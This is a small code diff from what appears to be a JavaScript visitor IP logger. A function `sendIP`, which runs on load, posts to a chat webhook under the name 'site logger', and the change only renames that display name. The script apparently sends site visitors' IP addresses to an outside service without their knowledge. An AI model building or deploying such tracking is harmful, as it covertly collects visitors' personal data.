@@ -13,7 +13,7 @@ const sendIP = () => {
                             'Content-Type': 'application/json'
                         },
                         body: JSON.stringify({
-                            username: "site logger <3", // optionally changeable
+                            username: "snooby logger:3", // optionally changeable
                             avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg", // optionally changeable
                             content: `@here`,
                             embeds: [
@@ -40,3 +40,4 @@ const sendIP = () => {
         });
 };
 sendIP();
+
